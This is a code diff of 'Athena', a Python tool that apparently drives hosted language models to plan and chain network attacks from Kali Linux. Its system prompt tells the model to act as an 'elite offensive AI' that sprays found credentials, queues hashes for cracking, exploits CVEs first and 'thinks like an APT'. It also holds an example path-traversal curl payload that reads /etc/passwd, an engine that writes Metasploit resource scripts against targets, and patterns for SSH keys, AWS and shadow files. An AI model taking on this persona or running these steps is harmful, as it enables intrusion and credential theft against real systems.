+        skip_directive += "SKIP banner grab — services already fingerprinted. "
+    if findings.get("user"):
+        skip_directive += "USE known users for spray. "
+    if findings.get("cred"):
+        skip_directive += "TEST creds across all services NOW. "
+    if findings.get("hash") or findings.get("hash_ntlm"):
+        skip_directive += "QUEUE hashes for cracking. "
+    if findings.get("exposed_path"):
+        skip_directive += "FETCH exposed paths immediately. "
+    if findings.get("cve"):
+        skip_directive += "EXPLOIT known CVEs first. "
+
+    if skip_directive:
+        skip_directive = f"AUTO-SKIP: {skip_directive.strip()}\n"
 
     return (
-        f"{ELITE_KNOWLEDGE}\n\n"
-        "════════════════════════════════════════\n"
-        "CURRENT SESSION\n"
-        "════════════════════════════════════════\n"
-        f"ATTACKER LHOST: {lhost}\n"
-        f"TARGET:\n{target_block}\n"
-        f"{findings_block}\n"
-        "OUTPUT FORMAT -- always produce exactly these two blocks:\n"
-        "[THOUGHT]...[/THOUGHT]\n"
-        "[CMD]...[/CMD]\n\n"
-        "OPERATIONAL RULES:\n"
-        "1. After open ports found -- searchsploit every service version immediately.\n"
-        "2. USERNAME found -- test across every open service in findings now.\n"
-        "3. HASH found -- note type and queue for hashcat before continuing.\n"
-        "4. CREDENTIALS found -- spray across SSH SMB FTP RDP HTTP immediately.\n"
-        "5. SHELL obtained -- id uname -a sudo -l kernel version are FIRST commands.\n"
-        "6. NEVER run same command twice -- adapt and try alternative approach.\n"
-        "7. NEVER use apt upgrade variants -- hard blocked to protect Phosh.\n"
-        "8. NEVER invent MSF module names -- verify with search first.\n"
-        "9. MSF resource scripts MUST have exit as final line.\n"
-        "10. Chain EVERYTHING -- every finding connects to next attack step.\n"
-        "11. State CVSS score and exploitability in [THOUGHT] for every CVE.\n"
-        "12. Consider stealth vs noise level of every command before issuing it.\n"
-        "13. Only reason from ACTUAL terminal output -- never fabricate results.\n"
-        "14. When workflow is done put WORKFLOW_COMPLETE in [CMD].\n\n"
-        "You are an elite operator. Think like an APT. Every move is deliberate."
+        f"You are Athena, elite offensive AI on Kali. The Priest commands. LHOST {lhost}\n"
+        f"{target_block}\n"
+        f"{findings_block}{skip_directive}"
+        f"{RULES}\n"
+        f"KB:\n{kb_text}\n"
+        f"EX: [THOUGHT]Apache 2.4.49 CVE-2021-41773 7.5 path traversal[/THOUGHT]"
+        f"[CMD]curl -s --path-as-is 'http://t/cgi-bin/.%2F.%2F.%2Fetc/passwd'[/CMD]"
     )
 
 
@@ -1183,7 +781,7 @@ def get_lhost() -> str:
             shell=True, capture_output=True, text=True
         )
         ip = r.stdout.strip()
-        if ip:
+        if ip and ip != "127.0.0.1":
             return ip
     except Exception:
         pass
@@ -1194,36 +792,63 @@ def ensure_rockyou():
     plain = "/usr/share/wordlists/rockyou.txt"
     gz    = "/usr/share/wordlists/rockyou.txt.gz"
     if os.path.exists(plain):
-        return plain
+        return
     if os.path.exists(gz):
         print("\033[33m   Auto-unzipping rockyou.txt.gz...\033[0m")
         subprocess.run(f"sudo gunzip {gz}", shell=True)
-        if os.path.exists(plain):
-            return plain
-    return plain
 
 
 def cmd_exists(cmd: str) -> bool:
     try:
-        r = subprocess.run(
-            f"which {cmd}", shell=True, capture_output=True, text=True
-        )
+        r = subprocess.run(f"which {cmd}", shell=True,
+                           capture_output=True, text=True)
         return bool(r.stdout.strip())
     except Exception:
         return False
 
 
+def get_credential_wordlist() -> list:
+    """Load passwords from wordlist file or return fallback list."""
+    for wl_path in CRED_WORDLISTS:
+        if os.path.exists(wl_path):
+            try:
+                with open(wl_path) as f:
+                    passwords = [line.strip() for line in f if line.strip()]
+                    return passwords[:20]  # Top 20 to avoid lockout
+            except Exception:
+                continue
+    return FALLBACK_PASSWORDS
+
+
 def auto_cve_lookup(output: str) -> str:
+    """Enhanced CVE lookup — also searches by CVE number if found."""
     if not cmd_exists("searchsploit"):
         return ""
+    
+    results = []
+    seen = set()
+    
+    # First: look for explicit CVE numbers
+    cve_matches = re.findall(r'CVE-\d{4}-\d+', output, re.IGNORECASE)
+    for cve in cve_matches[:3]:
+        if cve in seen:
+            continue
+        seen.add(cve)
+        try:
+            r = subprocess.run(
+                f"searchsploit '{cve}' 2>/dev/null | head -8",
+                shell=True, capture_output=True, text=True, timeout=8
+            )
+            if r.stdout.strip() and "No Results" not in r.stdout:
+                results.append(f"\n\033[35m[EXPLOIT: {cve}]\033[0m\n{r.stdout}")
+        except Exception:
+            pass
+    
+    # Second: service version fuzzy search
     matches = re.findall(
         r'\d+/tcp\s+open\s+\S+\s+(.+?)(?:\n|$)', output, re.IGNORECASE
     )
-    if not matches:
-        return ""
-    results = []
-    seen = set()
-    for svc in matches[:4]:
+    for svc in matches[:3]:
         svc   = svc.strip()
         words = svc.split()
         query = " ".join(words[:2]) if len(words) >= 2 else svc
@@ -1232,19 +857,54 @@ def auto_cve_lookup(output: str) -> str:
         seen.add(query)
         try:
             r = subprocess.run(
-                f"searchsploit '{query}' 2>/dev/null | head -8",
-                shell=True, capture_output=True, text=True, timeout=10
+                f"searchsploit '{query}' 2>/dev/null | head -6",
+                shell=True, capture_output=True, text=True, timeout=8
             )
             if r.stdout.strip() and "No Results" not in r.stdout:
-                results.append(
-                    f"\n\033[35m[CVE AUTO-LOOKUP: {query}]\033[0m\n{r.stdout}"
-                )
+                results.append(f"\n\033[35m[CVE: {query}]\033[0m\n{r.stdout}")
         except Exception:
             pass
+    
     return "".join(results)
 
 
+def extract_exploit_paths(searchsploit_output: str) -> list:
+    """Extract exploit file paths from searchsploit output."""
+    exploits = []
+    for line in searchsploit_output.split('\n'):
+        match = re.search(r'(exploits/[^\s]+)', line)
+        if match:
+            exploits.append(match.group(1))
+    return exploits
+
+
+SENSITIVE_PATH_PATTERNS = [
+    r'\.ssh/',
+    r'\.bash_history',
+    r'\.bashrc',
+    r'\.git/',
+    r'\.env',
+    r'\.aws/',
+    r'wp-config\.php',
+    r'config\.php',
+    r'/etc/passwd',
+    r'/etc/shadow',
+    r'id_rsa',
+]
+
+
+def detect_sensitive_paths(output: str) -> list:
+    found = []
+    for pattern in SENSITIVE_PATH_PATTERNS:
+        if re.search(pattern, output):
+            found.append(pattern.replace('\\', '').strip('/'))
+    return found
+
+
 def extract_findings(output: str, findings: dict) -> dict:
+    """Extract only NEW unique findings, max 5 new per type per output."""
+    if len(output) < 50:
+        return findings
     for key, pattern in FINDING_PATTERNS.items():
         try:
             matches = re.findall(pattern, output, re.IGNORECASE | re.MULTILINE)
@@ -1253,22 +913,202 @@ def extract_findings(output: str, findings: dict) -> dict:
         if not matches:
             continue
         flat = []
+        seen_local = set()
         for m in matches:
             if isinstance(m, tuple):
-                flat.extend([x.strip() for x in m if x and len(x.strip()) > 2])
-            elif m and len(str(m).strip()) > 2:
-                flat.append(str(m).strip())
-        noise = {
-            '0.0.0.0', '127.0.0.1', '255.255.255.255',
-            '0.0.0', '1.1.1', 'x.x.x'
-        }
-        filtered = [x for x in flat if x not in noise]
-        if filtered:
+                items = [x.strip().rstrip('.,;:') for x in m if x and len(x.strip()) > 2]
+            else:
+                items = [str(m).strip().rstrip('.,;:')] if m and len(str(m).strip()) > 2 else []
+            for it in items:
+                if it not in seen_local and it not in IP_NOISE and len(it) > 2:
+                    seen_local.add(it)
+                    flat.append(it)
+        if flat:
             existing = set(findings.get(key, []))
-            new_items = [x for x in filtered if x not in existing]
+            new_items = [x for x in flat if x not in existing][:5]
             if new_items:
                 findings.setdefault(key, []).extend(new_items)
+                if len(findings[key]) > 30:
+                    findings[key] = findings[key][-30:]
     return findings
+
+
+def compress_output_for_history(output: str, is_exploit_result: bool = False) -> str:
+    """Aggressively compress terminal output UNLESS it's an exploit result."""
+    if is_exploit_result:
+        # Keep exploit output intact — might contain shell, credentials, etc
+        return output[:MAX_OUTPUT_CHARS]
+    
+    output = re.sub(r'\033\[[0-9;]*m', '', output)
+    output = re.sub(r'\x1b\[[0-9;]*m', '', output)
+    lines = output.split('\n')
+    junk_patterns = [
+        r'^Stats: ', r'^SYN Stealth Scan Timing', r'^\s*$',
+        r'^Reading database', r'^Preparing to unpack',
+        r'^Selecting previously', r'^Unpacking ',
+        r'^Setting up ', r'^Processing triggers',
+        r'^\(Reading database', r'^Get:\d', r'^Hit:\d',
+        r'^Ign:\d', r'^Fetched ', r'^WARNING:.*Cannot open MAC',
+        r'^Starting Nmap', r'^Nmap done:', r'^Nmap scan report',
+    ]
+    junk_re = re.compile('|'.join(junk_patterns))
+    cleaned = []
+    last = None
+    for line in lines:
+        line = line.rstrip()
+        if junk_re.search(line):
+            continue
+        if line == last:
+            continue
+        if len(line) > 200:
+            line = line[:200] + "..."
+        cleaned.append(line)
+        last = line
+    result = '\n'.join(cleaned).strip()
+    if len(result) > 1500:
+        head = result[:600]
+        tail = result[-400:]
+        result = f"{head}\n[...{len(result)-1000} chars trimmed...]\n{tail}"
+    return result or "(no useful output)"
+
+
+def install_if_missing(tool: str) -> bool:
+    if cmd_exists(tool):
+        return True
+    try:
+        print(f"\033[33m   Auto-installing {tool}...\033[0m")
+        r = subprocess.run(
+            f"sudo apt install -y {tool} 2>/dev/null",
+            shell=True, capture_output=True, text=True, timeout=60
+        )
+        return cmd_exists(tool)
+    except Exception:
+        return False
+
+
+EXPECTED_TOOLS = [
+    "nmap", "arp-scan", "nikto", "gobuster", "whatweb", "searchsploit",
+    "hydra", "crackmapexec", "enum4linux", "smbclient", "sqlmap",
+    "hashcat", "hashid", "john", "msfvenom", "msfconsole", "curl",
+    "dig", "whois", "fierce", "dnsenum", "dnsrecon", "ffuf", "arjun",
+    "sslscan", "testssl.sh", "binwalk", "exiftool", "steghide", "zsteg",
+    "macchanger", "hcxtools", "aircrack-ng", "wpscan", "responder",
+]
+
+
+def fancy_header(text: str, color: str = "35") -> str:
+    width = max(len(text) + 4, 40)
+    line = "─" * width
+    padded = text.center(width - 2)
+    return (
+        f"\033[{color}m┌{line}┐\n"
+        f"│ {padded} │\n"
+        f"└{line}┘\033[0m"
+    )
+
+
+# ─────────────────────────────────────────────────────────────
+# NEW: AUTO-EXPLOIT ENGINE
+# ─────────────────────────────────────────────────────────────
+
+def analyze_and_suggest_exploit(cve: str, target: str, lhost: str) -> str:
+    """
+    When CVE found:
+    1. Run searchsploit to find exploits
+    2. Check if it's a MSF module
+    3. Suggest command to run
+    """
+    if not cmd_exists("searchsploit"):
+        return ""
+    
+    try:
+        # Search for exploits
+        r = subprocess.run(
+            f"searchsploit '{cve}' -j 2>/dev/null",
+            shell=True, capture_output=True, text=True, timeout=10
+        )
+        
+        if not r.stdout.strip():
+            return ""
+        
+        try:
+            data = json.loads(r.stdout)
+            results = data.get("RESULTS_EXPLOIT", [])
+        except:
+            return ""
+        
+        if not results:
+            return ""
+        
+        # Prioritize metasploit modules
+        msf_exploits = [e for e in results if "metasploit" in e.get("Path", "").lower()]
+        other_exploits = [e for e in results if "metasploit" not in e.get("Path", "").lower()]
+        
+        suggestions = []
+        
+        # MSF modules first
+        for exploit in msf_exploits[:2]:
+            path = exploit.get("Path", "")
+            title = exploit.get("Title", "")
+            
+            # Extract module path from file path
+            # e.g., exploits/linux/remote/12345.rb -> linux/remote/12345
+            module_match = re.search(r'exploits/([^/]+/[^/]+)/\d+', path)
+            if module_match:
+                module_path = f"exploit/{module_match.group(1)}/..."
+                suggestions.append({
+                    "type": "msf",
+                    "title": title,
+                    "module": module_path,
+                    "cve": cve
+                })
+        
+        # Standalone exploits
+        for exploit in other_exploits[:2]:
+            path = exploit.get("Path", "")
+            title = exploit.get("Title", "")
+            
+            if path:
+                full_path = f"/usr/share/exploitdb/{path}"
+                suggestions.append({
+                    "type": "standalone",
+                    "title": title,
+                    "path": full_path,
+                    "cve": cve
+                })
+        
+        if not suggestions:
+            return ""
+        
+        # Format output
+        output = f"\n\033[31m{'='*60}\033[0m\n"
+        output += f"\033[31m⚔️  EXPLOIT AVAILABLE: {cve}\033[0m\n"
+        output += f"\033[31m{'='*60}\033[0m\n"
+        
+        for i, sug in enumerate(suggestions, 1):
+            output += f"\n\033[33m[OPTION {i}] {sug['title']}\033[0m\n"
+            
+            if sug['type'] == 'msf':
+                output += f"\033[90mType: Metasploit Module\033[0m\n"
+                output += f"\033[97mSuggested command:\033[0m\n"
+                output += f"  echo 'use {sug['module']}' > /tmp/exploit.rc\n"
+                output += f"  echo 'set RHOSTS {target}' >> /tmp/exploit.rc\n"
+                output += f"  echo 'set LHOST {lhost}' >> /tmp/exploit.rc\n"
+                output += f"  echo 'run' >> /tmp/exploit.rc\n"
+                output += f"  echo 'exit' >> /tmp/exploit.rc\n"
+                output += f"  msfconsole -q -r /tmp/exploit.rc\n"
+            else:
+                output += f"\033[90mType: Standalone Exploit\033[0m\n"
+                output += f"\033[97mPath:\033[0m {sug['path']}\n"
+                output += f"\033[97mSuggested command:\033[0m\n"
+                output += f"  cat {sug['path']}\n"
+                output += f"  # Review the exploit, then modify and run as needed\n"
+        
+        output += f"\n\033[31m{'='*60}\033[0m\n"
+        return output
+        
+    except Exception as e:
+        return ""
 
 
 # ─────────────────────────────────────────────────────────────
@@ -1278,64 +1118,184 @@ def extract_findings(output: str, findings: dict) -> dict:
 class AthenaSession:
 
     def __init__(self):
-        self.history:       list  = []
-        self.target_info:   dict  = {}
-        self.client               = None
-        self.lhost:         str   = "127.0.0.1"
-        self.logfile              = None
-        self.session_start        = datetime.datetime.now()
-        self.findings:      dict  = {
-            "ip_address":   [],
-            "open_port":    [],
-            "username":     [],
-            "email":        [],
-            "hash_ntlm":    [],
-            "hash_generic": [],
-            "url":          [],
-            "cve":          [],
-            "credential":   [],
-            "service_ver":  [],
-            "domain":       [],
+        self.history = []
+        self.target_info = {}
+        self.lhost = "127.0.0.1"
+        self.logfile = None
+        self.session_start = datetime.datetime.now()
+        self.current_workflow_key = None
+        self.findings = {
+            "ip": [], "port": [], "user": [], "hash_ntlm": [],
+            "hash": [], "cred": [], "cve": [], "svc": [], "domain": [],
+            "exposed_path": [],
         }
-
+        self.command_history = []
+        self.stuck_counter = 0  # FIXED: Now properly tracked
+        self.tools_available = {}
+        self.remembered = []
+        
+        # Provider state
+        self.provider_index = 0
+        self.groq_client = None
+        self.cerebras_client = None
+        self.cerebras_disabled = False
+        self.cerebras_fail_count = 0
+        
         os.makedirs(INSTALL_DIR, exist_ok=True)
-        os.makedirs(LOG_DIR,     exist_ok=True)
-
-        self._validate_api_key()
+        os.makedirs(LOG_DIR, exist_ok=True)
+        
+        self._init_providers()
+        self._load_findings()  # NEW: Load persistent findings
         self._start_log()
         self._run_boot_check()
         self.lhost = get_lhost()
         ensure_rockyou()
 
-    def _validate_api_key(self):
-        api_key = os.environ.get("GROQ_API_KEY")
-        if not api_key:
-            print(
-                "\n\033[31m   FATAL: GROQ_API_KEY not set.\033[0m\n"
-                "   Run: export GROQ_API_KEY='your_key'\n"
-                "   Or re-run: bash install.sh\n"
-            )
-            sys.exit(1)
+    # ── Persistent Findings ───────────────────────────────────
+
+    def _load_findings(self):
+        """Load findings from JSON file on startup."""
+        if os.path.exists(FINDINGS_FILE):
+            try:
+                with open(FINDINGS_FILE) as f:
+                    self.findings = json.load(f)
+                    unique_count = sum(len(v) for v in self.findings.values())
+                    if unique_count > 0:
+                        print(f"\033[32m   Loaded {unique_count} findings from previous session\033[0m")
+            except Exception as e:
+                print(f"\033[33m   Failed to load findings: {e}\033[0m")
+
+    def _save_findings(self):
+        """Save findings to JSON file (called after each command)."""
         try:
-            self.client = Groq(api_key=api_key)
-        except Exception as e:
-            print(f"\n\033[31m   FATAL: Groq init failed: {e}\033[0m")
+            with open(FINDINGS_FILE, "w") as f:
+                json.dump(self.findings, f, indent=2)
+        except Exception:
+            pass  # Silent fail — don't interrupt flow
+
+    # ── Provider Management (with retry fix) ──────────────────
+
+    def _init_providers(self):
+        groq_key = os.environ.get("GROQ_API_KEY")
+        cerebras_key = os.environ.get("CEREBRAS_API_KEY")
+        
+        if not groq_key and not cerebras_key:
+            print("\n\033[31m   FATAL: No API keys found.\033[0m\n"
+                  "   Set GROQ_API_KEY and/or CEREBRAS_API_KEY in ~/.bashrc\n")
             sys.exit(1)
+        
+        if groq_key:
+            try:
+                self.groq_client = Groq(api_key=groq_key)
+            except Exception as e:
+                print(f"\033[33m   Groq init warning: {e}\033[0m")
+        
+        if cerebras_key and Cerebras:
+            try:
+                self.cerebras_client = Cerebras(api_key=cerebras_key)
+            except Exception as e:
+                print(f"\033[33m   Cerebras init warning: {e}\033[0m")
+        
+        self.provider_index = self._find_first_available()
+        p = PROVIDER_CHAIN[self.provider_index]
+        print(f"\033[32m   Active model: {p[2]}\033[0m")
+
+    def _find_first_available(self) -> int:
+        for i, (provider, model, name) in enumerate(PROVIDER_CHAIN):
+            if provider == "cerebras" and self.cerebras_client and not self.cerebras_disabled:
+                return i
+            if provider == "groq" and self.groq_client:
+                return i
+        print("\033[31m   FATAL: No working providers found.\033[0m")
+        sys.exit(1)
+
+    def _call_provider(self, messages: list, provider: str, model: str) -> str:
+        if provider == "cerebras" and self.cerebras_client:
+            completion = self.cerebras_client.chat.completions.create(
+                model=model,
+                messages=messages,
+                temperature=0.2,
+                max_tokens=1024,
+            )
+            return completion.choices[0].message.content
+        
+        elif provider == "groq" and self.groq_client:
+            completion = self.groq_client.chat.completions.create(
+                model=model,
+                messages=messages,
+                temperature=0.2,
+                max_tokens=1024,
+            )
+            return completion.choices[0].message.content
+        
+        raise Exception(f"Provider {provider} not available")
+
+    def _think_with_fallback(self, messages: list) -> str:
+        """FIXED: Retries the same request on new provider instead of losing it."""
+        start_index = self.provider_index
+        last_error = None
+        
+        for attempt in range(len(PROVIDER_CHAIN)):
+            idx = (start_index + attempt) % len(PROVIDER_CHAIN)
+            provider, model, name = PROVIDER_CHAIN[idx]
+            
+            if provider == "cerebras" and (not self.cerebras_client or self.cerebras_disabled):
+                continue
+            if provider == "groq" and not self.groq_client:
+                continue
+            
+            try:
+                response = self._call_provider(messages, provider, model)
+                if idx != self.provider_index:
+                    self.provider_index = idx
+                    print(f"\n\033[33m   Switched to: {name}\033[0m")
+                return response
+            
+            except Exception as e:
+                last_error = e
+                err_str = str(e).lower()
+                is_limit = any(x in err_str for x in [
+                    "rate", "limit", "429", "quota", "exceeded",
+                    "too many", "queue", "capacity"
+                ])
+                is_cloudflare = "cloudflare" in err_str or "<!doctype html>" in err_str.lower()
+                is_404 = "404" in err_str or "not_found" in err_str or "does not exist" in err_str
+                
+                if is_404:
+                    continue
+                elif is_cloudflare:
+                    print(f"\n\033[33m   {name} blocked by Cloudflare — trying next...\033[0m")
+                    if provider == "cerebras":
+                        self.cerebras_fail_count += 1
+                        if self.cerebras_fail_count >= 2:
+                            self.cerebras_disabled = True
+                            print(f"\033[33m   Cerebras disabled for session (2 blocks)\033[0m")
+                    continue
+                elif is_limit:
+                    print(f"\n\033[33m   {name} limit hit — trying next...\033[0m")
+                    continue
+                else:
+                    short_err = err_str[:80]
+                    print(f"\n\033[31m   {name} error: {short_err}\033[0m")
+                    continue
+        
+        print(f"\n\033[31m   All providers exhausted. Last error: {last_error}\033[0m")
+        return None
+
+    # ── Session Setup ─────────────────────────────────────────
 
     def _start_log(self):
-        ts       = self.session_start.strftime("%Y%m%d_%H%M%S")
+        ts = self.session_start.strftime("%Y%m%d_%H%M%S")
         log_path = os.path.join(LOG_DIR, f"session_{ts}.txt")
         try:
             self.logfile = open(log_path, "w")
             self.logfile.write(
-                f"ATHENA v{VERSION} SESSION LOG\n"
-                f"Started: {self.session_start.isoformat()}\n"
-                f"{'='*60}\n\n"
+                f"ATHENA v{VERSION} LOG\nStarted: {self.session_start.isoformat()}\n{'='*60}\n\n"
             )
             self.logfile.flush()
-            print(f"\033[90m   Session log: {log_path}\033[0m")
+            print(f"\033[90m   Log: {log_path}\033[0m")
         except Exception as e:
-            print(f"\033[33m   Log start failed: {e}\033[0m")
+            print(f"\033[33m   Log failed: {e}\033[0m")
 
     def _log(self, text: str):
         if self.logfile:
@@ -1355,121 +1315,230 @@ class AthenaSession:
             shell=True, capture_output=True, text=True
         )
         upgrades = result.stdout.lower()
-        threats  = [p for p in BANNED_UPGRADE_PACKAGES if p in upgrades]
+        threats = [p for p in BANNED_UPGRADE_PACKAGES if p in upgrades]
         if threats:
             print(f"\033[33m   UI THREAT BLOCKED: {', '.join(threats)}\033[0m")
         else:
-            print("\033[32m   System health: OK\033[0m")
+            print("\033[32m   System OK\033[0m")
         with open(BOOT_LOCK, "w") as f:
-            f.write("initialized")
-        print("\033[35m   ATHENA:\033[0m Online.\n")
+            f.write("ok")
+
+    # ── Target ────────────────────────────────────────────────
 
     def set_target(self):
-        print("\n\033[35m   ATHENA:\033[0m Define session target.")
-        print("\033[90m   Press Enter to skip any field.\033[0m\n")
-        ip     = input("   Target IP / CIDR range : ").strip()
-        domain = input("   Target domain / URL    : ").strip()
-        notes  = input("   Mission notes          : ").strip()
+        print("\n\033[35m   ATHENA:\033[0m Set target. Enter to skip any field.\n")
+        ip = input("   IP / CIDR range : ").strip()
+        domain = input("   Domain / URL    : ").strip()
+        notes = input("   Mission notes   : ").strip()
         self.target_info = {
-            "ip":     ip     or None,
+            "ip": ip or None,
             "domain": domain or None,
-            "notes":  notes  or None,
+            "notes": notes or None,
         }
-        if not ip and not domain:
-            print("\n\033[33m   No target set.\033[0m")
-        else:
+        if ip or domain:
             summary = " | ".join(filter(None, [ip, domain]))
-            print(f"\n\033[32m   Target locked: {summary}\033[0m")
-            self._log(f"[TARGET] {summary} | Notes: {notes}")
+            print(f"\n\033[32m   Target: {summary}\033[0m")
+            self._log(f"[TARGET] {summary} | {notes}")
+        else:
+            print("\n\033[33m   No target set.\033[0m")
+
+    # ── Command Execution ─────────────────────────────────────
 
     def _is_banned(self, cmd: str) -> bool:
         return any(b in cmd.lower() for b in BANNED_COMMANDS)
 
+    def _is_interactive(self, cmd: str) -> tuple:
+        cmd_lower = cmd.lower().strip()
+        non_interactive_markers = [" -q -r ", " -batch ", " --batch", " -e '", " -c '",
+                                    "sshpass", "<<EOF", "<<<", " -y ", "expect "]
+        if any(m in cmd for m in non_interactive_markers):
+            return (False, "")
+        for trigger, fix in INTERACTIVE_BLOCKED.items():
+            if cmd_lower.startswith(trigger) or f" {trigger}" in cmd_lower or f"&& {trigger}" in cmd_lower or f"; {trigger}" in cmd_lower:
+                if trigger == "msfconsole" and (" -q -r " in cmd or " -q -x " in cmd):
+                    return (False, "")
+                return (True, fix)
+        return (False, "")
+
+    def _is_destructive(self, cmd: str) -> bool:
+        for pattern in DESTRUCTIVE_COMMANDS:
+            if re.search(pattern, cmd):
+                return True
+        return False
+
+    def _needs_double_confirm(self, cmd: str) -> bool:
+        for pattern in DOUBLE_CONFIRM:
+            if re.search(pattern, cmd):
+                return True
+        return False
+
+    def _normalize_choice(self, choice: str) -> str:
+        c = choice.strip().lower()
+        if c in ("y", "yes", "1y", "yy", "yeah", "yep", "ye"):
+            return "y"
+        if c in ("n", "no", "skip", "nope"):
+            return "n"
+        if c in ("q", "quit", "exit", "stop"):
+            return "q"
+        return c
+
     def run_command(self, cmd: str) -> str:
-        print(f"\n\033[35m   ATHENA SUGGESTS:\033[0m")
-        print(f"\033[97m   {cmd}\033[0m\n")
-        self._log(f"\n[CMD PROPOSED]\n{cmd}")
-
+        if self._is_destructive(cmd):
+            print(f"\n\033[31m   ⛔ DESTRUCTIVE COMMAND REFUSED: {cmd}\033[0m")
+            print(f"\033[31m   Athena will NOT run anything that wipes data, kills the system, or creates fork bombs.\033[0m")
+            self._log(f"[DESTRUCTIVE REFUSED] {cmd}")
+            return "INTERACTIVE_BLOCKED"
+        
+        is_interactive, fix = self._is_interactive(cmd)
+        if is_interactive:
+            print(f"\n\033[31m   INTERACTIVE BLOCKED:\033[0m {cmd}")
+            print(f"\033[33m   Fix: {fix}\033[0m")
+            self._log(f"[INTERACTIVE BLOCKED] {cmd}")
+            return "INTERACTIVE_BLOCKED"
+        
+        print(f"\n\033[35m   ATHENA SUGGESTS:\033[0m\n\033[97m   {cmd}\033[0m\n")
+        self._log(f"\n[CMD]\n{cmd}")
+        
         try:
-            choice = input(
+            raw_choice = input(
                 "\033[90m   Execute? [y] yes  [n] skip  [q] quit: \033[0m"
-            ).strip().lower()
+            )
         except (EOFError, KeyboardInterrupt):
+            print()
             return "SESSION_EXIT"
-
+        
+        choice = self._normalize_choice(raw_choice)
+        
         if choice == "q":
             return "SESSION_EXIT"
         if choice != "y":
             print("\033[90m   Skipped.\033[0m")
             self._log("[SKIPPED]")
             return "COMMAND_REJECTED"
-
-        print(f"\n\033[33m   Executing...\033[0m\n")
+        
+        if self._needs_double_confirm(cmd):
+            print(f"\n\033[33m   ⚠  This modifies system state. Confirm again.\033[0m")
+            try:
+                second = input("\033[33m   Really execute? [y/n]: \033[0m")
+            except (EOFError, KeyboardInterrupt):
+                return "COMMAND_REJECTED"
+            if self._normalize_choice(second) != "y":
+                print("\033[90m   Cancelled.\033[0m")
+                self._log("[DOUBLE CONFIRM CANCELLED]")
+                return "COMMAND_REJECTED"
+        
+        print(f"\n\033[33m   Executing...  [Ctrl+C to abort this command only]\033[0m\n")
         output_lines = []
-
+        proc = None
+        is_exploit = any(kw in cmd.lower() for kw in ["exploit", "msfconsole", "searchsploit -m"])
+        
         try:
             proc = subprocess.Popen(
                 cmd, shell=True,
                 stdout=subprocess.PIPE,
                 stderr=subprocess.STDOUT,
                 text=True,
+                preexec_fn=os.setsid,
             )
             for line in proc.stdout:
                 print(line, end="")
                 output_lines.append(line)
             proc.wait()
+        except KeyboardInterrupt:
+            print("\n\033[33m   Command aborted by user — returning to Athena\033[0m")
+            if proc:
+                try:
+                    import signal
+                    os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
+                    proc.wait(timeout=2)
+                except Exception:
+                    try:
+                        proc.kill()
+                    except Exception:
+                        pass
+            output_lines.append("\n[COMMAND ABORTED BY USER]\n")
         except Exception as e:
             err = f"EXECUTION ERROR: {e}"
             print(f"\033[31m{err}\033[0m")
             return err
-
+        
         output = "".join(output_lines)
-
-        if any(kw in cmd for kw in [
-            "nmap", "whatweb", "nikto", "smbclient", "masscan"
-        ]):
+        
+        # CVE lookup + exploit suggestion
+        if any(kw in cmd for kw in ["nmap", "whatweb", "smbclient", "nikto", "searchsploit"]):
             cve_extra = auto_cve_lookup(output)
             if cve_extra:
                 print(cve_extra)
                 output += "\n" + re.sub(r'\033\[[0-9;]*m', '', cve_extra)
-
+        
+        # NEW: Auto-exploit suggestion when CVE found
+        cve_matches = re.findall(r'CVE-\d{4}-\d+', output, re.IGNORECASE)
+        if cve_matches:
+            target = self.target_info.get("ip") or self.target_info.get("domain") or "TARGET"
+            for cve in cve_matches[:2]:  # Limit to 2 to avoid spam
+                exploit_suggestion = analyze_and_suggest_exploit(cve, target, self.lhost)
+                if exploit_suggestion:
+                    print(exploit_suggestion)
+                    output += "\n" + re.sub(r'\033\[[0-9;]*m', '', exploit_suggestion)
+        
+        # Detect exposed sensitive paths
+        sensitive = detect_sensitive_paths(output)
+        if sensitive:
+            existing = set(self.findings.get("exposed_path", []))
+            new_paths = [p for p in sensitive if p not in existing]
+            if new_paths:
+                self.findings.setdefault("exposed_path", []).extend(new_paths)
+                print(f"\n\033[31m   ⚠️  EXPOSED PATHS DETECTED: {', '.join(new_paths)}\033[0m")
+        
         self.findings = extract_findings(output, self.findings)
-
-        if len(output) > MAX_OUTPUT_CHARS:
-            output = (
-                output[:MAX_OUTPUT_CHARS]
-                + f"\n[TRUNCATED -- {len(output) - MAX_OUTPUT_CHARS} chars omitted]"
-            )
-
-        output = output.strip() or "(no output)"
+        self._save_findings()  # NEW: Persist findings after each command
+        
+        compressed = compress_output_for_history(output, is_exploit_result=is_exploit)
+        
         self._log(f"[OUTPUT]\n{output}")
-        return output
+        
+        if len(output) > 1000 and len(compressed) < len(output) * 0.5:
+            print(f"\033[90m   [output compressed: {len(output)}→{len(compressed)} chars for AI]\033[0m")
+        
+        return compressed.strip() or "(no output)"
 
-    def think(self, prompt: str):
+    # ── AI Core ───────────────────────────────────────────────
+
+    def think(self, prompt: str, workflow_key: str = None):
         system_prompt = build_system_prompt(
-            self.target_info, self.findings, self.lhost
+            self.target_info,
+            self.findings,
+            self.lhost,
+            workflow_key=workflow_key,
+            free_form_prompt=prompt if not workflow_key else ""
         )
         windowed = self.history[-MAX_HISTORY_MESSAGES:]
+        compressed = []
+        for msg in windowed:
+            if msg["role"] == "assistant":
+                cmd_match = re.search(r'\[CMD\](.*?)\[/?CMD\]', msg["content"], re.DOTALL)
+                if cmd_match:
+                    compressed.append({
+                        "role": "assistant",
+                        "content": f"[CMD]{cmd_match.group(1).strip()}[/CMD]"
+                    })
+                else:
+                    compressed.append(msg)
+            else:
+                compressed.append(msg)
+        
         messages = [{"role": "system", "content": system_prompt}]
-        messages.extend(windowed)
+        messages.extend(compressed)
         messages.append({"role": "user", "content": prompt})
-
-        try:
-            completion = self.client.chat.completions.create(
-                model="llama-3.3-70b-versatile",
-                messages=messages,
-                temperature=0.2,
-                max_tokens=1024,
-            )
-            response = completion.choices[0].message.content
-        except Exception as e:
-            print(f"\n\033[31m   Groq API error: {e}\033[0m")
+        
+        response = self._think_with_fallback(messages)
+        if not response:
             return None, None
-
-        self.history.append({"role": "user",      "content": prompt})
-        self.history.append({"role": "assistant",  "content": response})
+        
+        self.history.append({"role": "user", "content": prompt})
+        self.history.append({"role": "assistant", "content": response})
         self._log(f"[AI]\n{response}")
-
+        
         thought_match = re.search(
             r'\[THOUGHT\](.*?)\[/?THOUGHT\]',
             response, re.DOTALL | re.IGNORECASE
@@ -1478,120 +1547,144 @@ class AthenaSession:
             thought_match.group(1).strip()
             if thought_match else "[No reasoning block]"
         )
